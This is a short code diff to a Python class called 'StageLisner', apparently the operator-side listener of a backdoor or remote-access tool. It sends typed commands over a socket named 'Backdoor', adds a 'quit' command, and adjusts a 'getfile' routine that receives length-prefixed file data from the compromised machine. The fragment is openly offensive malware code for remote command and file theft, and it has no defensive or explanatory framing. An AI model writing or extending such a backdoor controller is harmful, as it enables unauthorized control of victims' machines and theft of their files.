@@ -31,9 +31,11 @@ class StageLisner:
                 InPutCommand = input()
                 if InPutCommand == None :
                     Backdoor.sendall('\n'.encode(('latin-1')))
+                elif 'quit' in InPutCommand:
+                      Backdoor.sendall(InPutCommand.encode(('latin-1'))) 
+                      exit()   
                 elif 'getfile' in InPutCommand :
-                    Backdoor.sendall(InPutCommand.encode(('latin-1'))) 
-                    Backdoor.recv(1024)                
+                    Backdoor.sendall(InPutCommand.encode(('latin-1')))              
                     LenDataFile =  Backdoor.recv(4)
                     LenDataFile = int.from_bytes(LenDataFile, byteorder='big')
                     FileDataGet = b''
